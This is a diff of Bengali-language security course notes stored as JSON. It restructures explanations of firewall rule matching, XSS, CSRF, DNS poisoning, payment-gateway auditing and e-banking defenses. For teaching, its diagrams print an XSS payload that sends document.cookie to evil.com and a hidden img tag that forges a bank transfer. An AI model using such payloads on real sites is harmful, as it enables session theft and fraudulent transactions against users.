@@ -16,12 +16,33 @@
           "এটাই First Match (First Inspection) নীতি — প্রথম matching rule apply হলে বাকি rules দেখা হয় না।"
         ],
         "points": [
-          "First Inspection Rule = Firewall rules গুলো উপর থেকে নিচে ক্রমানুসারে check করা হয়",
-          "প্রথম যে rule টি packet এর সাথে match করে, সেটিই apply হয় — বাকি rules দেখা হয় না",
-          "Rule 1: Port 89 → 443 ≠ 89 → No Match",
-          "Rule 2: Port < 443 → 443 < 443 = false → No Match",
-          "Rule 3: Port 443 → 443 = 443 → MATCH → ACCEPTED ✅",
-          "কোনো rule না মিললে Default Policy প্রযোজ্য হয় — সাধারণত DENY ALL"
+          "First Inspection Rule (First Match) — নীতি:",
+          {
+            "sub": "Firewall rules গুলো উপর থেকে নিচে ক্রমানুসারে check করা হয়।"
+          },
+          {
+            "sub": "প্রথম যে rule টি packet এর সাথে match করে, সেটিই apply হয়।"
+          },
+          {
+            "sub": "Match পাওয়ার পর নিচের বাকি rules আর দেখা হয় না।"
+          },
+          "এই packet (Port 443) ধাপে ধাপে:",
+          {
+            "sub": "Rule 1 — Port 89: 443 == 89? না → No Match, পরের rule এ যায়।"
+          },
+          {
+            "sub": "Rule 2 — Port < 443: 443 < 443? mathematically false → No Match।"
+          },
+          {
+            "sub": "Rule 3 — Port 443: 443 == 443? হ্যাঁ → MATCH → packet ACCEPTED।"
+          },
+          {
+            "sub": "Rule 3 এ match হয়ে গেছে, তাই এর পরে আর কিছু দেখা হয় না।"
+          },
+          "কোনো rule না মিললে:",
+          {
+            "sub": "Default Policy প্রযোজ্য হয় — সাধারণত DENY ALL।"
+          }
         ],
         "diagram": " Packet: Source=A, Dest=B, Port=443\n          │\n          ▼\n ┌─────────────────────────────────┐\n │ Rule 1: Src=A, Dst=B, Port=89  │\n │ 443 == 89?  → ❌ NO MATCH      │\n └────────────────┬────────────────┘\n                  │ next rule\n                  ▼\n ┌─────────────────────────────────┐\n │ Rule 2: Src=A, Dst=B, Port<443 │\n │ 443 < 443? → ❌ NO MATCH       │\n └────────────────┬────────────────┘\n                  │ next rule\n                  ▼\n ┌─────────────────────────────────┐\n │ Rule 3: Src=A, Dst=B, Port=443 │\n │ 443 == 443? → ✅ MATCH!        │\n │         PACKET ACCEPTED         │\n └─────────────────────────────────┘\n          (Rule 3 এর পর আর দেখা হয় না)\n\n DEFAULT POLICY (কোনো rule না মিললে):\n Rule 1 → No Match\n Rule 2 → No Match  →  DENY ALL ❌\n Rule 3 → No Match",
         "mistakes": [
@@ -56,15 +77,75 @@
           "আধুনিক সমাধান: HTTPOnly, SameSite, CORS, DNSSEC।"
         ],
         "points": [
-          "XSS: Attacker trusted website এ malicious JS inject করে → script victim এর browser এ run করে → document.cookie চুরি করে attacker এর server এ পাঠায়",
-          "CSRF: Cookie চুরি করে না — victim এর browser কে দিয়ে bank.com এ unwanted request করায়। Browser automatically victim এর cookie পাঠায় → blind attack",
-          "DNS Poisoning: DNS cache এ ভুল IP inject করে → bank.com টাইপ করলে victim attacker এর fake server এ যায় → credentials ও session চুরি হয়",
-          "HTTPOnly flag: JavaScript দিয়ে cookie access বন্ধ → XSS এর cookie theft ঠেকায়",
-          "SameSite=Strict: Cookie শুধু same-site request এ যায় → CSRF সম্পূর্ণ ঠেকায়",
-          "CORS: cross-origin response reading block করে → evil.com bank.com/api এর response পড়তে পারে না",
-          "DNSSEC: DNS records cryptographically sign করে → poisoned record verify হয় না → block হয়"
+          "XSS (Cross-Site Scripting) — cookie চুরি করে:",
+          {
+            "sub": "Attacker কোনো trusted website এ malicious JavaScript inject করে।"
+          },
+          {
+            "sub": "Victim পেজটি খুললে সেই script তার browser এ চলে।"
+          },
+          {
+            "sub": "Script document.cookie পড়ে session cookie attacker এর server এ পাঠিয়ে দেয়।"
+          },
+          {
+            "sub": "Attacker সেই cookie বসিয়ে victim সেজে login করে ফেলে।"
+          },
+          {
+            "diagram": "XSS — script inject করে cookie চুরি\n\n [1] Attacker bank.com এ inject করে:\n     <script>fetch('evil.com/?c=' + document.cookie)</script>\n\n [2] Payload bank.com এর DB তে জমা হয়\n\n [3] Victim bank.com খোলে\n       │\n       ▼\n     browser script টি চালায়   ← server পাঠিয়েছে বলে trusted মনে করে\n       │\n       ▼\n     document.cookie  ──────►  evil.com\n\n [4] Attacker ওই cookie বসিয়ে victim সেজে login করে",
+            "label": "Diagram — XSS"
+          },
+          "CSRF (Cross-Site Request Forgery) — cookie ব্যবহার করে, চুরি করে না:",
+          {
+            "sub": "Victim আগে থেকেই bank.com এ logged in, তাই browser এ session cookie আছে।"
+          },
+          {
+            "sub": "Attacker victim কে দিয়ে bank.com এ একটি unwanted request করায় (যেমন লুকানো img tag)।"
+          },
+          {
+            "sub": "Browser নিয়ম অনুযায়ী সেই request এর সাথে victim এর cookie নিজেই জুড়ে দেয়।"
+          },
+          {
+            "sub": "bank.com ভাবে request টি victim নিজেই করেছে, তাই কাজটি হয়ে যায়।"
+          },
+          {
+            "sub": "Attacker cookie এর মান কখনো দেখেই না — তাই একে blind attack বলে।"
+          },
+          {
+            "diagram": "CSRF — cookie চুরি নয়, cookie ব্যবহার\n\n [1] Victim আগে থেকেই logged in:  Cookie: session=abc\n\n [2] Attacker এর পেজে লুকানো থাকে:\n     <img src=\"bank.com/transfer?to=hacker&amt=50000\">\n\n [3] Browser নিজেই request পাঠায়:\n     GET bank.com/transfer?to=hacker&amt=50000\n     Cookie: session=abc          ← browser স্বয়ংক্রিয়ভাবে জুড়ে দিল\n\n [4] bank.com ভাবে victim নিজেই পাঠিয়েছে  →  transfer হয়ে গেল\n\n Attacker cookie এর মান কখনো দেখেনি — blind attack",
+            "label": "Diagram — CSRF"
+          },
+          "DNS Poisoning — victim কে ভুল সার্ভারে পাঠায়:",
+          {
+            "sub": "Attacker DNS cache এ bank.com এর বিপরীতে ভুল IP ঢুকিয়ে দেয়।"
+          },
+          {
+            "sub": "Victim ঠিকঠাক bank.com টাইপ করলেও attacker এর fake server এ পৌঁছায়।"
+          },
+          {
+            "sub": "সেখানে login করলে credentials ও session cookie দুটোই attacker এর হাতে যায়।"
+          },
+          {
+            "diagram": "DNS POISONING — ঠিকানা বদলে দেওয়া\n\n স্বাভাবিক:\n     bank.com  ──DNS──►  192.168.1.1     (আসল bank server)\n\n Poisoned:\n     bank.com  ──DNS──►  10.0.0.99       (attacker এর fake server)\n\n Victim ঠিকঠাক bank.com টাইপ করেও fake server এ পৌঁছায়\n       │\n       ▼\n     login করে  ──►  credentials + session cookie attacker এর হাতে",
+            "label": "Diagram — DNS Poisoning"
+          },
+          "আধুনিক প্রতিরোধ:",
+          {
+            "sub": "HTTPOnly flag: JavaScript দিয়ে cookie পড়া বন্ধ — XSS এর cookie theft ঠেকায়।"
+          },
+          {
+            "sub": "SameSite=Strict: cookie শুধু same-site request এ যায় — CSRF সম্পূর্ণ ঠেকায়।"
+          },
+          {
+            "sub": "CORS: cross-origin response পড়া block করে — evil.com, bank.com/api এর response পড়তে পারে না।"
+          },
+          {
+            "sub": "DNSSEC: DNS record cryptographically sign করা হয়, তাই poisoned record verify হয় না।"
+          },
+          {
+            "diagram": "কোন header কোন attack ঠেকায়\n\n Set-Cookie: session=abc; HttpOnly\n     → JavaScript cookie পড়তে পারে না            (XSS এর cookie theft)\n\n Set-Cookie: session=abc; SameSite=Strict\n     → cross-site request এ cookie যায় না         (CSRF)\n\n Access-Control-Allow-Origin: bank.com\n     → evil.com response পড়তে পারে না             (CORS)\n\n DNSSEC — DNS record এ cryptographic signature\n     → poisoned record verify হয় না, reject হয়    (DNS Poisoning)",
+            "label": "Diagram — আধুনিক প্রতিরোধ"
+          }
         ],
-        "diagram": "XSS FLOW:\n Attacker injects: <script>fetch('evil.com/?c='+document.cookie)</script>\n → stored in bank.com DB\n Victim visits bank.com → script runs → cookie sent to evil.com\n Attacker logs in AS victim ✅\n\nCSRF FLOW:\n Victim logged into bank.com (cookie: session=abc)\n Attacker sends: <img src='bank.com/transfer?to=hacker&amt=50000'>\n Browser auto-sends: GET bank.com/... + Cookie: session=abc\n bank.com thinks victim requested it → transfer done ❌\n Attacker never saw the cookie — used it blindly\n\nDNS POISONING FLOW:\n Normal:   bank.com → DNS → 192.168.1.1 (real bank) ✅\n Poisoned: bank.com → DNS → 10.0.0.99 (fake bank) ❌\n Victim types bank.com → lands on attacker's server\n Logs in → credentials + session cookie stolen\n\nMODERN DEFENSES:\n Set-Cookie: session=abc; HttpOnly    ← JS cannot read cookie (XSS fix)\n Set-Cookie: session=abc; SameSite=Strict ← no cross-site sending (CSRF fix)\n Access-Control-Allow-Origin: bank.com   ← CORS blocks evil.com reading (CSRF fix)\n DNSSEC: cryptographic signature on DNS  ← poisoned records rejected",
         "mistakes": [
           [
             "HTTPOnly দিলে CSRF থেকে রক্ষা পাওয়া যায়",
@@ -138,11 +219,63 @@
           "Mr. X দুটো আলাদা payment gateway audit করবেন — তাকে security protocol differences, vulnerabilities, compliance, threat detection ও access control — এই পাঁচটি মূল scenario face করতে হবে।"
         ],
         "points": [
-          "a) Differences in Security Protocols: দুটো gateway এর TLS version, encryption standard, authentication mechanism আলাদা হতে পারে। Mr. X কে compare করতে হবে কোনটি industry best practice মেনে চলছে কি না। Example: একটি TLS 1.3 ব্যবহার করছে, অন্যটি পুরনো TLS 1.0",
-          "b) Vulnerability Assessment: Software bug, weak authentication, misconfigured settings খুঁজে বের করা। Severity অনুযায়ী remediation recommend করা। Example: একটি gateway এ SQL injection vulnerability বা default admin password পাওয়া",
-          "c) Data Security & Compliance (PCI DSS): Payment Card Industry Data Security Standard মানা হচ্ছে কি না যাচাই করা। Cardholder data encrypted at rest ও in transit আছে কি না check করা। Non-compliance মানে data breach ও legal penalty",
-          "d) Threat Detection & Response: IDS (Intrusion Detection System) কতটা effective — log monitoring, alert system পরীক্ষা। Incident response procedure কত দ্রুত কাজ করে। Example: Brute-force attack detect করতে কত সময় লাগছে test করা",
-          "e) Access Control & Authorization: Sensitive payment data ও critical system এ শুধু authorized personnel access করতে পারছে কি না। Role-based access control (RBAC) ঠিকমতো implement হয়েছে কি না। Example: Developer কি production database এ সরাসরি access পাচ্ছে — পাওয়া উচিত নয়"
+          "a) Security Protocol এর পার্থক্য:",
+          {
+            "sub": "দুটো gateway এর TLS version, encryption standard ও authentication mechanism আলাদা হতে পারে।"
+          },
+          {
+            "sub": "Mr. X কে compare করতে হবে কোনটি industry best practice মেনে চলছে।"
+          },
+          {
+            "sub": "উদাহরণ: একটি TLS 1.3 ব্যবহার করছে, অন্যটি পুরনো ও দুর্বল TLS 1.0।"
+          },
+          "b) Vulnerability Assessment:",
+          {
+            "sub": "Software bug, weak authentication ও misconfigured setting খুঁজে বের করতে হবে।"
+          },
+          {
+            "sub": "প্রতিটি finding এর severity অনুযায়ী remediation recommend করতে হবে।"
+          },
+          {
+            "sub": "উদাহরণ: একটি gateway এ SQL injection vulnerability বা default admin password পাওয়া গেল।"
+          },
+          "c) Data Security ও Compliance (PCI DSS):",
+          {
+            "sub": "PCI DSS (Payment Card Industry Data Security Standard) মানা হচ্ছে কি না যাচাই করতে হবে।"
+          },
+          {
+            "sub": "Cardholder data at rest ও in transit — দুই অবস্থাতেই encrypted কি না check করতে হবে।"
+          },
+          {
+            "sub": "Non-compliance মানে data breach এর ঝুঁকি এবং legal penalty।"
+          },
+          "d) Threat Detection ও Response:",
+          {
+            "sub": "IDS (Intrusion Detection System) কতটা effective তা পরীক্ষা করতে হবে।"
+          },
+          {
+            "sub": "Log monitoring ও alert system ঠিকমতো কাজ করছে কি না দেখতে হবে।"
+          },
+          {
+            "sub": "Incident response procedure কত দ্রুত কাজ করে তা যাচাই করতে হবে।"
+          },
+          {
+            "sub": "উদাহরণ: brute-force attack detect করতে কত সময় লাগছে তা test করা।"
+          },
+          "e) Access Control ও Authorization:",
+          {
+            "sub": "Sensitive payment data ও critical system এ শুধু authorized personnel ঢুকতে পারছে কি না দেখতে হবে।"
+          },
+          {
+            "sub": "Role-based access control (RBAC) ঠিকমতো implement হয়েছে কি না যাচাই করতে হবে।"
+          },
+          {
+            "sub": "উদাহরণ: Developer production database এ সরাসরি access পাচ্ছে কি না — পাওয়া উচিত নয়।"
+          },
+          {
+            "diagram": "Mr. X এর audit — দুই gateway, পাঁচটি ধাপ\n\n   Gateway A                      Gateway B\n       │                              │\n       └───────────────┬──────────────┘\n                       ▼\n        ┌──────────────────────────────┐\n        │ 1. Security Protocol         │   TLS version, cipher, auth\n        ├──────────────────────────────┤\n        │ 2. Vulnerability Assessment  │   bug, misconfig, weak auth\n        ├──────────────────────────────┤\n        │ 3. PCI DSS Compliance        │   cardholder data encryption\n        ├──────────────────────────────┤\n        │ 4. Threat Detection          │   IDS, log, incident response\n        ├──────────────────────────────┤\n        │ 5. Access Control            │   RBAC, least privilege\n        └──────────────┬───────────────┘\n                       ▼\n            Risk report + remediation\n\n   প্রতিটি ধাপে দুটো gateway আলাদাভাবে যাচাই করে তুলনা করতে হবে",
+            "label": "Diagram — Audit এর পরিধি"
+          }
         ],
         "table": {
           "headers": [
@@ -199,15 +332,72 @@
           "Stateful Inspection শুধু packet header ও connection state দেখে। NGFW deep packet inspection, application control ও IPS সহ অনেক বেশি কাজ করে।"
         ],
         "points": [
-          "Firewall কী? একটি network security device বা software যা trusted internal network ও untrusted external network (internet) এর মধ্যে barrier হিসেবে কাজ করে। Predefined security rules এর ভিত্তিতে traffic allow বা block করে",
-          "Stateful Inspection Firewall: OSI Layer 4 (Transport) পর্যন্ত কাজ করে — শুধু packet header (IP address, Port number, protocol) ও connection state track করে। TCP connection এর state মনে রাখে (SYN, established, closed)। Application-level content দেখতে পারে না। কম resource প্রয়োজন, দ্রুত কিন্তু সীমিত। উদাহরণ: iptables, Cisco ASA (basic mode)",
-          "Next-Generation Firewall (NGFW): OSI Layer 7 (Application) পর্যন্ত কাজ করে। Deep Packet Inspection (DPI) — packet এর ভেতরের data পর্যন্ত দেখতে পারে। Application awareness — নির্দিষ্ট app (Facebook, Skype, Zoom) চেনে ও block করতে পারে। Integrated IPS (Intrusion Prevention System), Anti-virus, Sandboxing। User identity-based policy (কে access করছে সেটা দেখে)। খরচ বেশি। উদাহরণ: Palo Alto, FortiGate, Check Point NGFW, Sophos XG",
-          "ব্যবহারিক প্রয়োগ:",
+          "Firewall কী:",
           {
-            "sub": "কোথায় কোনটি: stateful firewall ভেতরের segmentation ও শাখা অফিসের সাধারণ traffic নিয়ন্ত্রণে যথেষ্ট (iptables, ছোট router) — সস্তা ও দ্রুত।"
+            "sub": "একটি network security device বা software।"
           },
           {
-            "sub": "NGFW বসে internet edge ও DMZ perimeter এ (ব্যাংক, ডাটা সেন্টার) — যেখানে কোন application কে অনুমতি দেওয়া হবে (Facebook, Zoom, টরেন্ট), কোন user করছে, এবং packet এর ভেতরে malware বা exploit আছে কিনা তা দেখা দরকার।"
+            "sub": "Trusted internal network ও untrusted external network (internet) এর মাঝে barrier হিসেবে বসে।"
+          },
+          {
+            "sub": "Predefined security rules এর ভিত্তিতে traffic allow বা block করে।"
+          },
+          "Stateful Inspection Firewall:",
+          {
+            "sub": "OSI Layer 4 (Transport) পর্যন্ত কাজ করে।"
+          },
+          {
+            "sub": "শুধু packet header দেখে — IP address, port number ও protocol।"
+          },
+          {
+            "sub": "TCP connection এর state মনে রাখে (SYN, established, closed)।"
+          },
+          {
+            "sub": "Application-level content দেখতে পারে না।"
+          },
+          {
+            "sub": "কম resource লাগে ও দ্রুত, কিন্তু ক্ষমতা সীমিত।"
+          },
+          {
+            "sub": "উদাহরণ: iptables, Cisco ASA (basic mode)।"
+          },
+          "Next-Generation Firewall (NGFW):",
+          {
+            "sub": "OSI Layer 7 (Application) পর্যন্ত কাজ করে।"
+          },
+          {
+            "sub": "Deep Packet Inspection (DPI) — packet এর ভেতরের data পর্যন্ত দেখতে পারে।"
+          },
+          {
+            "sub": "Application awareness — নির্দিষ্ট app (Facebook, Skype, Zoom) চিনে block করতে পারে।"
+          },
+          {
+            "sub": "Integrated IPS (Intrusion Prevention System), anti-virus ও sandboxing থাকে।"
+          },
+          {
+            "sub": "User identity-based policy — কে access করছে সেটাও দেখে সিদ্ধান্ত নেয়।"
+          },
+          {
+            "sub": "খরচ বেশি।"
+          },
+          {
+            "sub": "উদাহরণ: Palo Alto, FortiGate, Check Point NGFW, Sophos XG।"
+          },
+          "ব্যবহারিক প্রয়োগ:",
+          {
+            "sub": "Stateful firewall যথেষ্ট ভেতরের segmentation ও শাখা অফিসের সাধারণ traffic নিয়ন্ত্রণে (iptables, ছোট router)।"
+          },
+          {
+            "sub": "কারণ সেখানে সস্তা ও দ্রুত সমাধান দরকার, application-স্তরের বিচার নয়।"
+          },
+          {
+            "sub": "NGFW বসে internet edge ও DMZ perimeter এ — ব্যাংক ও ডাটা সেন্টারে।"
+          },
+          {
+            "sub": "সেখানে দেখতে হয় কোন application কে অনুমতি দেওয়া হবে (Facebook, Zoom, টরেন্ট)।"
+          },
+          {
+            "sub": "কোন user সেটি করছে এবং packet এর ভেতরে malware বা exploit আছে কি না — তাও যাচাই করতে হয়।"
           }
         ],
         "table": {
@@ -285,12 +475,60 @@
           "একটি secure e-banking system এর জন্য multi-layered security দরকার — WAF, SSL/TLS, DMZ, 2FA, IDS/IPS ও Load Balancer একসাথে ব্যবহার করলে defense in depth তৈরি হয়।"
         ],
         "points": [
-          "WAF (Web Application Firewall): SQL Injection, XSS, CSRF এর মতো application-layer attack block করে। F5, FortiWeb, AWS WAF ব্যবহার করা হয়",
-          "SSL/TLS Encryption: Data transmission এ encryption — EV SSL certificate ব্যবহার। Browser এ green padlock ও HTTPS নিশ্চিত করে। Data in transit সুরক্ষিত রাখে",
-          "DMZ (Demilitarized Zone): Web server সরাসরি internal network এ না রেখে isolated DMZ zone এ রাখা। Breach হলেও internal bank database directly exposed হয় না",
-          "Two-Factor Authentication (2FA): User login এ OTP (SMS/Email) বা hardware token। Password চুরি হলেও second factor ছাড়া login সম্ভব নয়",
-          "IDS/IPS (Intrusion Detection/Prevention System): Network এ অস্বাভাবিক activity detect (IDS) ও block (IPS) করে। Real-time alert ও automatic blocking",
-          "Load Balancer: Multiple server এ traffic distribute করে — single server overload ও DDoS এর প্রভাব কমায়। High Availability নিশ্চিত করে। Nginx, F5 BIG-IP ব্যবহার করা হয়"
+          "WAF (Web Application Firewall):",
+          {
+            "sub": "SQL Injection, XSS ও CSRF এর মতো application-layer attack block করে।"
+          },
+          {
+            "sub": "উদাহরণ: F5, FortiWeb, AWS WAF।"
+          },
+          "SSL/TLS Encryption:",
+          {
+            "sub": "Data transmission encrypt করে — EV SSL certificate ব্যবহার করা হয়।"
+          },
+          {
+            "sub": "Browser এ green padlock ও HTTPS দেখিয়ে বিশ্বাসযোগ্যতা নিশ্চিত করে।"
+          },
+          {
+            "sub": "Data in transit eavesdropping থেকে সুরক্ষিত রাখে।"
+          },
+          "DMZ (Demilitarized Zone):",
+          {
+            "sub": "Web server সরাসরি internal network এ না রেখে আলাদা isolated zone এ রাখা হয়।"
+          },
+          {
+            "sub": "Web server breach হলেও internal bank database সরাসরি exposed হয় না।"
+          },
+          "Two-Factor Authentication (2FA):",
+          {
+            "sub": "User login এ OTP (SMS/Email) বা hardware token লাগে।"
+          },
+          {
+            "sub": "Password চুরি হলেও second factor ছাড়া login সম্ভব নয়।"
+          },
+          "IDS/IPS (Intrusion Detection / Prevention System):",
+          {
+            "sub": "Network এ অস্বাভাবিক activity detect করে (IDS)।"
+          },
+          {
+            "sub": "সন্দেহজনক traffic স্বয়ংক্রিয়ভাবে block করে (IPS)।"
+          },
+          {
+            "sub": "Real-time alert দেয় এবং automatic blocking চালায়।"
+          },
+          "Load Balancer:",
+          {
+            "sub": "Multiple server এ traffic ভাগ করে দেয়।"
+          },
+          {
+            "sub": "Single server overload ও DDoS এর প্রভাব কমায়।"
+          },
+          {
+            "sub": "High Availability নিশ্চিত করে।"
+          },
+          {
+            "sub": "উদাহরণ: Nginx, F5 BIG-IP।"
+          }
         ],
         "diagram": "Internet Users\n      │\n      ▼\n[Load Balancer] ← distributes traffic, absorbs DDoS\n      │\n      ▼\n[WAF] ← blocks SQLi, XSS, CSRF\n      │\n      ▼\n[NGFW] ← deep packet inspection\n      │\n      ▼\n[DMZ — Web Servers] ← SSL/TLS encrypted, 2FA enforced\n      │\n[IDS/IPS] ← monitors all traffic\n      │\n      ▼\n[Internal Network — DB Servers] ← not directly accessible",
         "table": {
@@ -353,18 +591,97 @@
           "Payload delivery দিয়ে ভাগ: Reflected = URL/request এর সাথে আসে (server bounce করে ফেরত দেয়), Stored = server এ জমা থাকে (প্রতিটি visitor কে দেওয়া হয়)।"
         ],
         "points": [
-          "মূল কথা: XSS এ browser server এর পাঠানো script কে \"trusted\" ভাবে বিনা প্রশ্নে চালায়। দুর্বলতার আসল কারণ — user input কে output এ দেওয়ার আগে validate/encode করা হয় না, তাই input এর ভেতরের <script> কোড হিসেবে গণ্য হয়।",
-          "Reflected XSS — payload delivery: script HTTP request এর অংশ হিসেবে যায় (URL parameter, form input)। Server সেই input কে কোনো response পেজে হুবহু \"reflect\" করে ফেরত দেয়, browser সেটা execute করে। Server এ কিছু জমা থাকে না — তাই non-persistent।",
-          "Reflected — কীভাবে victim আক্রান্ত হয়: attacker কে আগে victim কে একটা crafted malicious link এ click করাতে হয় (email/message এ পাঠিয়ে)। একটা ক্লিক = এক victim। তাই scope সাধারণত নির্দিষ্ট একজন।",
-          "Stored XSS — payload delivery: script server এ স্থায়ীভাবে জমা থাকে (database, comment, profile field, review)। কেউ ক্লিক করার দরকার নেই — page টি যেই খুলবে, server নিজেই তাকে জমানো script সহ পেজ পাঠাবে, browser execute করবে। তাই persistent।",
-          "Stored — কেন বেশি বিপজ্জনক: একবার জমা হলে যত user ওই পেজ দেখবে সবাই আক্রান্ত হয় — কোনো ফাঁদ/লিংক লাগে না। তাই attack scope অনেক বড় (সব visitor), Reflected এর চেয়ে গুরুতর।",
-          "প্রতিরোধ: input validation, output encoding (HTML escape), Content-Security-Policy (CSP) header, এবং cookie তে HttpOnly flag (script যেন cookie পড়তে না পারে)।",
+          "মূল কথা — XSS কেন ঘটে:",
+          {
+            "sub": "XSS এ browser server এর পাঠানো script কে \"trusted\" ভেবে বিনা প্রশ্নে চালায়।"
+          },
+          {
+            "sub": "আসল দুর্বলতা — user input কে output এ দেওয়ার আগে validate বা encode করা হয় না।"
+          },
+          {
+            "sub": "ফলে input এর ভেতরের <script> ট্যাগ data নয়, কোড হিসেবে গণ্য হয়।"
+          },
+          "Reflected XSS — payload delivery (কীভাবে পৌঁছায়):",
+          {
+            "sub": "Script HTTP request এর অংশ হিসেবে যায় — URL parameter বা form input এ।"
+          },
+          {
+            "sub": "Server সেই input কে response পেজে হুবহু \"reflect\" করে ফেরত দেয়।"
+          },
+          {
+            "sub": "Browser সেটি execute করে ফেলে।"
+          },
+          {
+            "sub": "Server এ কিছু জমা থাকে না — তাই এটি non-persistent।"
+          },
+          "Reflected — victim কীভাবে আক্রান্ত হয়:",
+          {
+            "sub": "Attacker কে আগে victim কে একটা crafted malicious link এ click করাতে হয়।"
+          },
+          {
+            "sub": "Link সাধারণত email বা message এ পাঠানো হয়।"
+          },
+          {
+            "sub": "একটা click = এক victim, তাই scope সাধারণত নির্দিষ্ট একজন।"
+          },
+          {
+            "diagram": "REFLECTED XSS — non-persistent, server bounce করে ফেরত দেয়\n\n [1] Attacker crafted link পাঠায় (email / message):\n     site.com/search?q=<script>steal(document.cookie)</script>\n\n [2] Victim link এ click করে\n       │\n       ▼\n [3] Request server এ যায়\n       │\n       ▼\n     SERVER   ← input কোথাও জমা রাখে না\n       │\n       ▼\n [4] input হুবহু response পেজে reflect হয়ে ফেরত আসে\n       │\n       ▼\n [5] Victim এর browser এ script চলে    ← একজন victim",
+            "label": "Diagram — Reflected XSS"
+          },
+          "Stored XSS — payload delivery (কীভাবে পৌঁছায়):",
+          {
+            "sub": "Script server এ স্থায়ীভাবে জমা থাকে — database, comment, profile field বা review তে।"
+          },
+          {
+            "sub": "কাউকে কোনো link এ click করতে হয় না।"
+          },
+          {
+            "sub": "পেজটি যেই খুলবে, server নিজেই তাকে জমানো script সহ পেজ পাঠাবে।"
+          },
+          {
+            "sub": "Browser সেটি execute করে — তাই এটি persistent।"
+          },
+          "Stored — কেন বেশি বিপজ্জনক:",
+          {
+            "sub": "একবার জমা হলে যত user ওই পেজ দেখবে সবাই আক্রান্ত হয়।"
+          },
+          {
+            "sub": "কোনো আলাদা ফাঁদ বা link লাগে না।"
+          },
+          {
+            "sub": "তাই attack scope অনেক বড় এবং Reflected এর চেয়ে গুরুতর।"
+          },
+          {
+            "diagram": "STORED XSS — persistent, server এ জমা থেকে সবাইকে পরিবেশন\n\n [1] Attacker comment / profile এ জমা দেয়:\n     <script>steal(document.cookie)</script>\n       │\n       ▼\n [2] SERVER  →  DATABASE তে স্থায়ীভাবে সংরক্ষিত\n\n [3] এরপর যে-ই পেজটি খুলবে:\n       Victim 1  ──►  server পেজ + জমানো script পাঠায়  ──►  script চলে\n       Victim 2  ──►  server পেজ + জমানো script পাঠায়  ──►  script চলে\n       Victim 3  ──►  server পেজ + জমানো script পাঠায়  ──►  script চলে\n\n     কোনো click লাগে না — সব visitor আক্রান্ত\n\n এক নজরে:\n   Reflected — payload request এ আসে, click লাগে, এক victim, non-persistent\n   Stored — payload server এ জমা থাকে, click লাগে না, সব visitor, persistent",
+            "label": "Diagram — Stored XSS"
+          },
+          "প্রতিরোধ:",
+          {
+            "sub": "Input validation — যা আসছে তা যাচাই করা।"
+          },
+          {
+            "sub": "Output encoding — HTML escape করে দেখানো।"
+          },
+          {
+            "sub": "Content-Security-Policy (CSP) header দেওয়া।"
+          },
+          {
+            "sub": "Cookie তে HttpOnly flag — script যেন cookie পড়তে না পারে।"
+          },
           "ব্যবহারিক প্রয়োগ:",
           {
-            "sub": "বাস্তবে কোথায় দেখা যায়: Reflected XSS সাধারণত search result বা error page এ — attacker crafted link পাঠিয়ে ক্লিক করায়; Stored XSS বসে comment, product review, profile bio বা support ticket এ, যেখানে ব্যবহারকারীর লেখা সংরক্ষিত হয়ে অন্যদের দেখানো হয়।"
+            "sub": "Reflected XSS সাধারণত search result বা error page এ দেখা যায়।"
+          },
+          {
+            "sub": "সেখানে attacker crafted link পাঠিয়ে click করায়।"
+          },
+          {
+            "sub": "Stored XSS বসে comment, product review, profile bio বা support ticket এ।"
+          },
+          {
+            "sub": "কারণ সেখানে ব্যবহারকারীর লেখা সংরক্ষিত হয়ে অন্যদের দেখানো হয়।"
           }
         ],
-        "diagram": "XSS: user input কে escape না করায় browser তা \"trusted script\" ভেবে চালায়\n\n REFLECTED XSS  (non-persistent — server bounce করে ফেরত দেয়)\n ─────────────────────────────────────────────────────────\n  Attacker                                  Victim\n     │  ① crafted malicious link পাঠায়         │\n     │  site.com/search?q=<script>…</script>   │\n     └─────────────────────────────────────────▶│ ② click করে\n                                                 │\n                              ┌──────────┐  ③ request\n                              │  SERVER  │◀─────┘\n                              │ (জমা রাখে │\n                              │   না!)    │──────┐ ④ input হুবহু\n                              └──────────┘      │   response এ reflect\n                                                 ▼\n                                         ⑤ Victim এর browser এ\n                                            script চলে 🔴 (একজন victim)\n\n\n STORED XSS  (persistent — server এ জমা, সবাইকে পরিবেশন)\n ─────────────────────────────────────────────────────────\n  Attacker                                 Victim 1 ┐\n     │ ① comment/profile এ                 Victim 2 ├─ যে-ই পেজ\n     │   <script>…</script> জমা দেয়         Victim 3 ┘   খুলবে\n     ▼                                          ▲\n ┌──────────────────────┐                       │ ③ page + জমানো\n │       SERVER         │                       │    script পাঠায়\n │  ┌────────────────┐  │  ② DB তে স্থায়ী জমা   │   (click লাগে না!)\n │  │  DATABASE      │  │───────────────────────┘\n │  │ <script>…</…>  │  │  ④ প্রত্যেক visitor এর\n │  └────────────────┘  │     browser এ script চলে 🔴🔴🔴\n └──────────────────────┘     (সব user আক্রান্ত)\n\n একনজরে:\n   Reflected:  payload request-এ আসে   → click লাগে → ১ জন → non-persistent\n   Stored   :  payload server-এ জমা থাকে → click লাগে না → সবাই → persistent",
         "mistakes": [
           [
             "Reflected ও Stored XSS দুটোতেই victim কে link এ click করতে হয়",
@@ -432,37 +749,99 @@
           "তাই উদ্দেশ্যও আলাদা — Encryption গোপন রাখে (confidentiality), Hashing অবিকৃত কিনা যাচাই করে (integrity/verification)।"
         ],
         "points": [
-          "মূল operational পার্থক্য: Encryption এ একটি বিপরীত operation (decrypt) সংজ্ঞায়িত আছে; Hashing এ সেটাই নেই — digest থেকে input বের করার কোনো পথ নেই, শুধু অনুমান করে re-hash করে মেলানো যায়।",
-          "Encryption — কীভাবে চলে",
+          "মূল operational পার্থক্য:",
           {
-            "sub": "Key লাগে। Symmetric (AES): encrypt ও decrypt একই key দিয়ে। Asymmetric (RSA): public key encrypt করে, জোড়া private key decrypt করে।"
+            "sub": "Encryption এ একটি বিপরীত operation (decrypt) সংজ্ঞায়িতই আছে।"
+          },
+          {
+            "sub": "Hashing এ সেই বিপরীত operation নেই — digest থেকে input বের করার কোনো পথ নেই।"
+          },
+          {
+            "sub": "শুধু অনুমান করে re-hash করে মিলিয়ে দেখা যায়, ফিরিয়ে আনা যায় না।"
+          },
+          "Encryption — কীভাবে চলে:",
+          {
+            "sub": "Key লাগে।"
+          },
+          {
+            "sub": "Symmetric (AES): encrypt ও decrypt একই key দিয়ে হয়।"
+          },
+          {
+            "sub": "Asymmetric (RSA): public key encrypt করে, জোড়া private key decrypt করে।"
           },
           {
             "sub": "Output এর দৈর্ঘ্য input এর সাথে বাড়ে — ১ MB file encrypt করলে ciphertext-ও প্রায় ১ MB।"
           },
           {
